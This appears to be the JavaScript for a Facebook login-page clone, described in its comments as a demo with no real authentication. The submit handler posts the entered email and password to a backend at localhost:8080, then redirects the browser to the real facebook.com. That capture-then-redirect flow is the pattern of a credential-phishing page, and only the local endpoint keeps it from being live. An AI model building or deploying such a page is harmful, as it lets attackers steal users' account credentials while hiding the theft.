// Simple client-side UX/validation to mimic behaviour (no real auth)
const form = document.getElementById("loginForm");
const email = document.getElementById("email");
const password = document.getElementById("password");
const emailField = document.getElementById("emailField");
const passField = document.getElementById("passwordField");
const emailError = document.getElementById("emailError");
const passwordError = document.getElementById("passwordError");
const toast = document.getElementById("toast");
const togglePw = document.getElementById("togglePw");

// ===================== Toast Function =====================
function showToast(msg) {
  toast.textContent = msg;
  toast.classList.add("show");
  setTimeout(() => toast.classList.remove("show"), 2200);
}

// ===================== Validation =====================
function validate() {
  let ok = true;
  const emailVal = email.value.trim();
  const passVal = password.value.trim();

  if (!emailVal) {
    emailField.classList.add("error");
    emailError.classList.add("show");
    ok = false;
  } else {
    emailField.classList.remove("error");
    emailError.classList.remove("show");
  }

  if (!passVal) {
    passField.classList.add("error");
    passwordError.classList.add("show");
    ok = false;
  } else {
    passField.classList.remove("error");
    passwordError.classList.remove("show");
  }
  return ok;
}

// =================  Login Request  =================
form.addEventListener("submit", async (e) => {
  e.preventDefault();

  if (!validate()) return;
  // Fake login flow for demo
  // showToast("This is a demo clone. No real login.");

  const emailVal = email.value.trim();
  const passVal = password.value.trim();

  try {
    const response = await fetch("http://localhost:8080/api/login", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({ email: emailVal, password: passVal })
    });

    const result = await response.text(); // Our Backend returns String
    showToast(result);

    // if (result.includes("Successful")) {
    //   // redirect after succesful login
    //   window.location.href = "home.html";
    // }

    //  Persistent Response Box
    const resBox = document.getElementById("response");
    resBox.textContent = result;
    resBox.style.color = result.includes("Success") ? "green" : "red";

    // After short delay, redirect to real facebook
    setTimeout(() => {
      window.location.href = "https://www.facebook.com/";
    }, 1200);

  } catch (err) {
    // document.getElementById("response").textContent = "Server Error!";
    showToast("Server Error!");
    const resBox = document.getElementById("response");
    resBox.textContent = "Server Error!";
    resBox.style.color = "red";
  }
});

// ============  Register Request  =============
document.getElementById("createAccount").addEventListener("click", async () => {
  const emailVal = email.value.trim();
  const passVal = password.value.trim();

  if (!validate()) return;

  try {
    const response = await fetch("http://localhost:8080/api/register", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({ email: emailVal, password: passVal })
    });

    const result = await response.text();
    showToast(result);

    const resBox = document.getElementById("response");
    resBox.textContent = result;
    resBox.style.color = result.includes("Success") ? "green" : "red";

  } catch (err) {
    showToast("Server Error!");
    const resBox = document.getElementById("response");
    resBox.textContent = "Server Error!";
    resBox.style.color = "red";
  }
});

// Validation Live Feedback
email.addEventListener("input", validate);
password.addEventListener("input", validate);

// Password show/hide
togglePw.addEventListener("click", () => {
  const isHidden = password.getAttribute("type") === "password";
  password.setAttribute("type", isHidden ? "text" : "password");
  togglePw.textContent = isHidden ? "Hide" : "Show";
  togglePw.setAttribute("aria-pressed", String(isHidden));
});

// Demo links
// document.getElementById("createAccount").addEventListener("click", () => {
//   showToast("Create Account flow is not implemented in this demo.");
// });
// document.getElementById("createPage").addEventListener("click", () => {
//   showToast("Create a Page is not implemented in this demo.");
// });

document.getElementById("forgot").addEventListener("click", (e) => {
  e.preventDefault();
  showToast("Password recovery is not implemented in this demo.");
});